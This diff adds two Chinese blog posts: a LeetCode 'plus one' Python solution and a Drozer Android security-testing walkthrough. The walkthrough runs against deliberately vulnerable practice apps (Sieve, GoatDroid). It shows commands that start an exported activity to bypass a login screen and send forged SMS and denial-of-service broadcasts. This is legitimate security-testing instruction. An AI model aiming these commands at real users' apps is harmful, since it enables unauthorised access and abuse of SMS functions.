@@ -191,6 +191,570 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://louis-me.github.io/aposts/9322dea6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="一个正经的测试工程师">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="施坤的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/aposts/9322dea6/" class="post-title-link" itemprop="url">leetcode-66-加1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-04-12 11:06:49 / 修改时间：11:29:15" itemprop="dateCreated datePublished" datetime="2022-04-12T11:06:49+08:00">2022-04-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/leetcode/" itemprop="url" rel="index"><span itemprop="name">leetcode</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/aposts/9322dea6/" class="post-meta-item leancloud_visitors" data-flag-title="leetcode-66-加1" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/aposts/9322dea6/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/aposts/9322dea6/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
+<li>本人零基础，数学基础极差，此系列开始学习下leetcode算法方面的题目</li>
+<li>都是leetcode的原题</li>
+</ul>
+<h2 id="0066-加一"><a href="#0066-加一" class="headerlink" title="0066. 加一"></a>0066. 加一</h2><ul>
+<li>难度：简单</li>
+<li>标签：数组</li>
+<li>本题来自<a target="_blank" rel="noopener" href="https://leetcode-cn.com/problems/plus-one/">这里</a></li>
+</ul>
+<h2 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h2><ul>
+<li><p>给定一个由 整数 组成的 非空 数组所表示的非负整数，在该数的基础上加一。</p>
+</li>
+<li><p>最高位数字存放在数组的首位， 数组中每个元素只存储单个数字。</p>
+</li>
+<li><p>你可以假设除了整数 0 之外，这个整数不会以零开头。</p>
+</li>
+</ul>
+<p>示例 1：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：digits = [1,2,3]</span><br><span class="line">输出：[1,2,4]</span><br><span class="line">解释：输入数组表示数字 123。</span><br></pre></td></tr></table></figure>
+
+<p>示例 2：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：digits = [4,3,2,1]</span><br><span class="line">输出：[4,3,2,2]</span><br><span class="line">解释：输入数组表示数字 4321。</span><br></pre></td></tr></table></figure>
+
+
+<p>示例 3：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：digits = [0]</span><br><span class="line">输出：[1]</span><br></pre></td></tr></table></figure>
+
+<h2 id="解体思路"><a href="#解体思路" class="headerlink" title="解体思路"></a>解体思路</h2><ul>
+<li><p>这道题把整个数组看成了一个整数，然后个位数 +1。问题的实质是利用数组模拟加法运算。</p>
+</li>
+<li><p>如果个位数不为 9 的话，直接把个位数 +1 就好。如果个位数为 9 的话，还要考虑进位。</p>
+</li>
+<li><p>还有一个注意的点：首位进位变成10之后也需要进行处理，因为会多一位数字</p>
+</li>
+</ul>
+<h2 id="具体代码"><a href="#具体代码" class="headerlink" title="具体代码"></a>具体代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">class Solution(object):</span><br><span class="line">    def plusOne(self, digits):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        :type digits: List[int]</span><br><span class="line">        :rtype: List[int]</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        # 最后一位值+1</span><br><span class="line">        digits[len(digits) - 1] += 1</span><br><span class="line">        # 以-1不停递减直到0，初始化值为最后一位索引</span><br><span class="line">        for i in range(len(digits) - 1, 0, -1):</span><br><span class="line">            # 末尾索引的值不为10，就退出循环</span><br><span class="line">            if digits[i] != 10:</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                # 末尾的值为10，就把赋值为0</span><br><span class="line">                digits[i] = 0</span><br><span class="line">                # 末尾-1后的索引值+1</span><br><span class="line">                digits[i - 1] += 1</span><br><span class="line"></span><br><span class="line">        # 如果首位为10</span><br><span class="line">        if digits[0] == 10:</span><br><span class="line">            # 首位赋值为1</span><br><span class="line">            digits[0] = 1</span><br><span class="line">            # 在第二位新增值为0</span><br><span class="line">            digits.append(0)</span><br><span class="line">        return digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line"></span><br><span class="line">    data = [9,9,9]</span><br><span class="line">    t = Solution().plusOne(data)</span><br><span class="line">    print(t) # [1, 0, 0, 0]</span><br><span class="line"></span><br><span class="line"> 	data = [1,2,4]</span><br><span class="line">    t = Solution().plusOne(data)</span><br><span class="line">    print(t) # [1,2,5]</span><br><span class="line">    </span><br><span class="line">    data = [0]</span><br><span class="line">    t = Solution().plusOne(data)</span><br><span class="line">    print(t) # [1]</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>可以<a target="_blank" rel="noopener" href="https://algo.itcharge.cn/">参考此系列</a>，刷算法</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://louis-me.github.io/aposts/2b1c1b8c/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="一个正经的测试工程师">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="施坤的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/aposts/2b1c1b8c/" class="post-title-link" itemprop="url">Drozer实践</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-06 16:39:18" itemprop="dateCreated datePublished" datetime="2022-04-06T16:39:18+08:00">2022-04-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-08 20:55:06" itemprop="dateModified" datetime="2022-04-08T20:55:06+08:00">2022-04-08</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/app%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">app安全测试</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/aposts/2b1c1b8c/" class="post-meta-item leancloud_visitors" data-flag-title="Drozer实践" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/aposts/2b1c1b8c/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/aposts/2b1c1b8c/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><code>drozer</code>是一款针对<code>Android</code>系统的安全测试框架，可以分成两个部分：其一是<code>console</code>，它运行在本地计算机上；其二是<code>server</code>，它是一个安装在目标<code>Android</code>设备上的<code>app</code>，当使用<code>console</code>与<code>Android</code>设备交互时，就是把<code>Java</code>代码输入到运行在实际设备上的<code>drozer</code>代理(<code>agent</code>)中。</p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul>
+<li>本地电脑安装<code>jdk1.7</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Admin&gt;java --version</span><br><span class="line">java 17.0.2 2022-01-18 LTS</span><br><span class="line">Java(TM) SE Runtime Environment (build 17.0.2+8-LTS-86)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 17.0.2+8-LTS-86, mixed mode, sharing)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>本地电脑装<code>adb</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Admin&gt;adb --version</span><br><span class="line">Android Debug Bridge version 1.0.40</span><br><span class="line">Version 4986621</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>本地python的版本，记得配置好环境变量</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Admin&gt;python --version</span><br><span class="line">Python 2.7.15</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>下载<code>drozer-2.4.4.win32.msi</code><a target="_blank" rel="noopener" href="https://github.com/mwrlabs/drozer">最新版本</a></li>
+</ul>
+<p><img src="/aposts/2b1c1b8c/image-20220407085705247.png" alt="image-20220407085705247"></p>
+<ul>
+<li>在<code>python2.7</code>的<code>script</code>目录可以看到安装的<code>drozer</code></li>
+</ul>
+<p><img src="/aposts/2b1c1b8c/image-20220407085922571.png" alt="image-20220407085922571"></p>
+<ul>
+<li>下载<a target="_blank" rel="noopener" href="https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk">drozer-agent-2.3.4.apk</a>安装包，安装到模拟器中(雷电)</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Admin&gt;adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">* daemon not running; starting now at tcp:5037</span><br><span class="line">* daemon started successfully</span><br><span class="line">emulator-5554   device</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\Admin&gt;adb install d:\appsafetest\drozer-agent-2.3.4.apk</span><br><span class="line">Success</span><br></pre></td></tr></table></figure>
+
+<p><img src="/aposts/2b1c1b8c/image-20220407090727709.png" alt="image-20220407090727709"></p>
+<ul>
+<li>模拟器中启动server</li>
+</ul>
+<p><img src="/aposts/2b1c1b8c/image-20220407093534775.png" alt="image-20220407093534775"></p>
+<ul>
+<li>安装依赖文件</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br><span class="line">pip install pyyaml</span><br><span class="line">pip install protobuf==3.17.3 # 一定要这个版本，用最新的版本无法启动drozer</span><br><span class="line">pip install pyOpenSSL</span><br><span class="line">pip install twisted</span><br><span class="line">pip install service_identity</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用 <code>adb </code>进行端口转发，转发到上边<code>Drozer</code>使用的端口 <code>31415</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:31415 tcp:31415</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>测试是否可以启动<code>drozer</code><ul>
+<li>一定要用<code>cd</code>进入到<code>drozer</code>的安装目录（<code>D:\app\Python27\Scripts</code>），不然<code>drozer</code>不能正常使用</li>
+<li>然后执行<code>drozer.bat console connect</code>连接<code>drozer</code>的<code>server</code></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cd D:\app\Python27\Scripts</span><br><span class="line"></span><br><span class="line">D:\app\Python27\Scripts&gt;drozer.bat console connect</span><br><span class="line"></span><br><span class="line">            ..                    ..:.</span><br><span class="line">           ..o..                  .r..</span><br><span class="line">            ..a..  . ....... .  ..nd</span><br><span class="line">              ro..idsnemesisand..pr</span><br><span class="line">              .otectorandroidsneme.</span><br><span class="line">           .,sisandprotectorandroids+.</span><br><span class="line">         ..nemesisandprotectorandroidsn:.</span><br><span class="line">        .emesisandprotectorandroidsnemes..</span><br><span class="line">      ..isandp,..,rotectorandro,..,idsnem.</span><br><span class="line">      .isisandp..rotectorandroid..snemisis.</span><br><span class="line">      ,andprotectorandroidsnemisisandprotec.</span><br><span class="line">     .torandroidsnemesisandprotectorandroid.</span><br><span class="line">     .snemisisandprotectorandroidsnemesisan:</span><br><span class="line">     .dprotectorandroidsnemesisandprotector.</span><br><span class="line"></span><br><span class="line">drozer Console (v2.4.4)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看下<code>drozer</code>的模块列表</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; list</span><br><span class="line">app.activity.forintent                   Find activities that can handle the given intent</span><br><span class="line">app.activity.info                        Gets information about exported activities.</span><br><span class="line">app.activity.start                       Start an Activity</span><br><span class="line">app.broadcast.info                       Get information about broadcast receivers</span><br><span class="line">app.broadcast.send                       Send broadcast using an intent</span><br><span class="line">app.broadcast.sniff                      Register a broadcast receiver that can sniff particular intents</span><br><span class="line">app.package.attacksurface                Get attack surface of package</span><br><span class="line">app.package.backup                       Lists packages that use the backup API (returns true on FLAG_ALLOW_BACKUP)</span><br><span class="line">app.package.debuggable                   Find debuggable packages</span><br><span class="line">.....</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>常用模块</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>模块名</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>app.activity.forintent</td>
+<td>通过intent查找它的activity</td>
+</tr>
+<tr>
+<td>app.activity.info</td>
+<td>获取activities信息</td>
+</tr>
+<tr>
+<td>app.activity.start</td>
+<td>开启 Activity</td>
+</tr>
+<tr>
+<td>app.broadcast.info</td>
+<td>获取broadcast receivers信息</td>
+</tr>
+<tr>
+<td>app.broadcast.send</td>
+<td>发送广播</td>
+</tr>
+<tr>
+<td>app.broadcast.sniff</td>
+<td>嗅探广播中intent的数据</td>
+</tr>
+<tr>
+<td>app.package.attacksurface</td>
+<td>确定安装包的可攻击面</td>
+</tr>
+<tr>
+<td>app.package.backup</td>
+<td>列出可备份的包</td>
+</tr>
+<tr>
+<td>app.package.debuggable</td>
+<td>列出可debug的包</td>
+</tr>
+<tr>
+<td>app.package.info</td>
+<td>获取已安装包的信息</td>
+</tr>
+<tr>
+<td>app.package.launchintent</td>
+<td>获取程序启动的activity信息</td>
+</tr>
+<tr>
+<td>app.package.list</td>
+<td>手机已安装的程序包</td>
+</tr>
+<tr>
+<td>app.package.manifest</td>
+<td>获取程序manifest文件信息</td>
+</tr>
+<tr>
+<td>app.package.native</td>
+<td>列出Native libraries 信息</td>
+</tr>
+<tr>
+<td>app.package.shareduid</td>
+<td>查找拥有共同uid的包和他们所有的权限</td>
+</tr>
+<tr>
+<td>app.provider.columns</td>
+<td>展示content provider URI的各列</td>
+</tr>
+<tr>
+<td>app.provider.delete</td>
+<td>删除content provider URI的内容</td>
+</tr>
+<tr>
+<td>app.provider.download</td>
+<td>使用openInputStream读取指定uri的内容，并下载在电脑中</td>
+</tr>
+<tr>
+<td>app.provider.info	获取</td>
+<td>content providers信息</td>
+</tr>
+<tr>
+<td>app.provider.insert</td>
+<td>插入数据到content provider</td>
+</tr>
+<tr>
+<td>app.provider.query</td>
+<td>查询content provider 内容</td>
+</tr>
+<tr>
+<td>app.provider.read</td>
+<td>使用openInputStream读取指定uri的内容</td>
+</tr>
+<tr>
+<td>app.provider.update</td>
+<td>更新content provider的内容</td>
+</tr>
+<tr>
+<td>app.service.info</td>
+<td>获取services的信息</td>
+</tr>
+<tr>
+<td>app.service.send</td>
+<td>使用 Message攻击暴露的service，其service实现了handleMessage</td>
+</tr>
+<tr>
+<td>app.service.start</td>
+<td>开启服务</td>
+</tr>
+<tr>
+<td>app.service.stop</td>
+<td>停止服务</td>
+</tr>
+</tbody></table>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ul>
+<li>本次的apk来自于<a target="_blank" rel="noopener" href="https://github.com/as0ler/Android-Examples/blob/master/sieve.apk">这里</a>，提前安装到模拟器上</li>
+<li>测试步骤来源<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/dfa92bab3a55">这里</a>，非常感谢此博客的分享</li>
+<li>查找包含<code>sieve</code>的包名</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.list -f sieve</span><br><span class="line">com.mwr.example.sieve (Sieve)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看包名的信息，我们已经获得应用数据目录、apk的路径、UID、GID等信息。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.info -a  com.mwr.example.sieve</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  Application Label: Sieve</span><br><span class="line">  Process Name: com.mwr.example.sieve</span><br><span class="line">  Version: 1.0</span><br><span class="line">  Data Directory: /data/user/0/com.mwr.example.sieve</span><br><span class="line">  APK Path: /data/app/com.mwr.example.sieve-1/base.apk</span><br><span class="line">  UID: 10039</span><br><span class="line">  GID: [3003]</span><br><span class="line">  Shared Libraries: null</span><br><span class="line">  Shared User ID: null</span><br><span class="line">  Uses Permissions:</span><br><span class="line">  - android.permission.READ_EXTERNAL_STORAGE</span><br><span class="line">  - android.permission.WRITE_EXTERNAL_STORAGE</span><br><span class="line">  - android.permission.INTERNET</span><br><span class="line">  Defines Permissions:</span><br><span class="line">  - com.mwr.example.sieve.READ_KEYS</span><br><span class="line">  - com.mwr.example.sieve.WRITE_KEYS</span><br></pre></td></tr></table></figure>
+
+<h3 id="确定可攻击面"><a href="#确定可攻击面" class="headerlink" title="确定可攻击面"></a>确定可攻击面</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.attacksurface com.mwr.example.sieve</span><br><span class="line">Attack Surface:</span><br><span class="line">  3 activities exported</span><br><span class="line">  0 broadcast receivers exported</span><br><span class="line">  1 content providers exported</span><br><span class="line">  0 services exported</span><br><span class="line">    is debuggable</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<h3 id="activity组件"><a href="#activity组件" class="headerlink" title="activity组件"></a>activity组件</h3><blockquote>
+<p>应用程序中，一个Activity通常就是一个单独的屏幕，它上面可以显示一些控件也可以监听并处理用户的事件做出响应。 Activity之间通过Intent进行通信。在Intent的描述结构中，有两个最重要的部分：动作和动作对应的数据。</p>
+</blockquote>
+<ul>
+<li>通过上边的命令可以发现<code>activity</code>存在问题，我们查看下用<code>apktool d sieve.apk</code>反编译出的的安装包的<code>AndroidManifest.xml</code>文件，可看到将<code>activity</code>的<code>exported</code>设置为<code>true</code>。说明存在被导出的分险</li>
+</ul>
+<p><img src="/aposts/2b1c1b8c/image-20220407105213231.png" alt="image-20220407105213231"></p>
+<ul>
+<li>查看对外的activity组件信息</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dz&gt;  run app.activity.info -a com.mwr.example.sieve</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  com.mwr.example.sieve.FileSelectActivity</span><br><span class="line">    Permission: null</span><br><span class="line">  com.mwr.example.sieve.MainLoginActivity</span><br><span class="line">    Permission: null</span><br><span class="line">  com.mwr.example.sieve.PWList</span><br><span class="line">    Permission: null</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用<code>app.activity.start</code>进行漏洞测试</li>
+</ul>
+<blockquote>
+<p>越权漏洞–绕过登录界面导致可直接访问Your Passwords界面，说明存在越权漏洞</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList</span><br></pre></td></tr></table></figure>
+
+<p><img src="/aposts/2b1c1b8c/image-20220407104315393.png" alt="image-20220407104315393"></p>
+<h3 id="Broadcast组件"><a href="#Broadcast组件" class="headerlink" title="Broadcast组件"></a>Broadcast组件</h3><blockquote>
+<p>BroadcastReceive广播接收器应用可以使用它对外部事件进行过滤只对感兴趣的外部事件(如当电话呼入时，或者数据网络可用时)进行接收并做出响应。广播接收器没有用户界面。然而，它们可以启动一个activity或serice 来响应它们收到的信息，或者用NotificationManager来通知用户。通知可以用很多种方式来吸引用户的注意力──闪动背灯、震动、播放声音等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。</p>
+</blockquote>
+<ul>
+<li><p>本次演练的apk来自于<a target="_blank" rel="noopener" href="https://github.com/linkedin/qark/blob/master/tests/goatdroid.apk">这里</a></p>
+</li>
+<li><p>下面使用<code>fourgoats.apk</code>测试<code>Broadcast</code>。查看<code>fourgoats</code>该APP的可攻击点，可以看到存在<code>broadcast</code>广播问题。</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.attacksurface org.owasp.goatdroid.fourgoats</span><br><span class="line">Attack Surface:</span><br><span class="line">  4 activities exported</span><br><span class="line">  1 broadcast receivers exported # 发现这里有一个广播可攻击</span><br><span class="line">  0 content providers exported</span><br><span class="line">  1 services exported</span><br><span class="line">    is debuggable</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用<code>app.activity.start</code>进行漏洞测试查看对外的<code>broadcas</code>t组件信息</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.broadcast.info -a org.owasp.goatdroid.fourgoats</span><br><span class="line">Package: org.owasp.goatdroid.fourgoats</span><br><span class="line">  org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver</span><br><span class="line">    Permission: null</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看反编译出(<code>apktool d goatdroid.apk</code>)的<code>AndroidManifest.xml</code>文件，可看到将<code>receiver</code>的<code>exported</code>设置未进行设置(由于存在了filter，默认属性为true)。说明存在越权问题，可发送恶意广播，伪造消息等等。</li>
+</ul>
+<p><img src="/aposts/2b1c1b8c/image-20220407111007905.png" alt="image-20220407111007905"></p>
+<blockquote>
+<p>当前broadcast Receiver 是否可以从当前应用外部获取Receiver message true，可以；false 不可以。如果为false ,当前broadcast Receiver 只能收到同一个应用或者拥有同一 user ID 应用发出广播。</p>
+<p>默认值根据当前 broadcast Receiver 是否包含intent filter来定。如果没有任何的filter的话意味着只有在被详细的描述了class name的情况下才会被唤起。这意味着当前Receiver只能在应用内部被使用（因为其它应用不知道这个类的存在。）在这种情况下，默认值是false。如果至少包含一个filter意味着当前broadcast Receiver 将会收到来自系统或者其它应用的广播，所以这个时候默认值是true。</p>
+<p>不只有这个属性可以指定broadcast Receiver 是否暴露给其它应用。你也可以使用permission来限制外部应用给他发送消息</p>
+<p>更多的<a target="_blank" rel="noopener" href="https://blog.csdn.net/watermusicyes/article/details/46460347">参考资料</a></p>
+</blockquote>
+<ul>
+<li>反编译查看源代码，发现需要两个参数<code>phoneNumber</code>和<code>message</code>。</li>
+</ul>
+<p><img src="/aposts/2b1c1b8c/image-20220408194905671.png" alt="image-20220408194905671"></p>
+<h4 id="漏洞利用-可发送恶意广播包"><a href="#漏洞利用-可发送恶意广播包" class="headerlink" title="漏洞利用-可发送恶意广播包"></a>漏洞利用-可发送恶意广播包</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 1234 --extra string message pwnd!</span><br></pre></td></tr></table></figure>
+
+<p><img src="/aposts/2b1c1b8c/image-20220408195320526.png" alt="image-20220408195320526"></p>
+<h4 id="漏洞利用，拒绝服务攻击检测"><a href="#漏洞利用，拒绝服务攻击检测" class="headerlink" title="漏洞利用，拒绝服务攻击检测"></a>漏洞利用，拒绝服务攻击检测</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS</span><br></pre></td></tr></table></figure>
+
